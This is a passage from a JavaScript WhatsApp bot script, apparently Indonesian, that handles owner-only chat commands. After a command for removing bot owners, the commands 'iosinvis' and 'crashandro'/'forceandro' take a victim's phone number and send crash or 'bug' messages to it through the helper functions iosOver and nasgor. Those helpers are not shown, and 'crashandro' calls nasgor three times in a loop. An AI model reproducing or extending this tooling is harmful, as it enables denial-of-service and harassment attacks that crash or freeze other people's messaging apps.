                await sleep(5000)
                m.reply(capt, add)
            }
            break
            case 'delowner':{
                if (!isOwner) return reply(config.message.owner)
                if (!q) return reply(`— ex: ${prefix + command} 62`);
            
                let bijipler = q.replace(/[^0-9]/g,"")
                if (bijipler.startsWith('0')) return reply(`— ex: ${prefix + command} 62 !!`)
                let index = kontributor.indexOf(bijipler)
                if (index>-1) {
                    kontributor.splice(index,1)
                    fs.writeFileSync(path.resolve(__dirname,'./satanic/lib/database/owner.json'),JSON.stringify(kontributor),'utf8')
                    reply("owner berhasil dihapus")
                } else {
                    reply("nomor tidak ditemukan dalam daftar owner")
                }
            }
            break
            
            // bug
            case 'iosinvis': {
                if (!isOwner) return reply(config.message.owner);
                if (!q) return reply(`— ex: ${prefix + command} 62`);
                
                let jidx = q.replace(/[^0-9]/g, "");
                if (jidx.startsWith('0')) return reply(`— ex: ${prefix + command} 62 !!`)
                
                let isTarget = `${jidx}@s.whatsapp.net`;
                reply(`success! sent ios invisible to ${isTarget}`);
                
                iosOver(24, isTarget);
                console.log(chalk.red.bold("Success!"))
            }
            break;

            // bug
            case 'crashandro':
            case 'forceandro': {
                if (!isOwner) return reply(config.message.owner);
                if (!q) return reply(`— ex: ${prefix + command} 62`);
                
                let jidx = q.replace(/[^0-9]/g, "");
                if (jidx.startsWith('0')) return reply(`— ex: ${prefix + command} 62 !!`)
                
                let isTarget = `${jidx}@s.whatsapp.net`;
                reply(`success! sent bug to ${isTarget}`);
                
                for (let i = 0; i < 3; i++) {
                    await nasgor(isTarget);
                }
                console.log(chalk.red.bold("Success!"))
            }
            break;
            default:
        }
    } catch (err) {
        console.log(require("util").format(err));
    }
};

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file)
  console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
  delete require.cache[file]
  require(file)
})
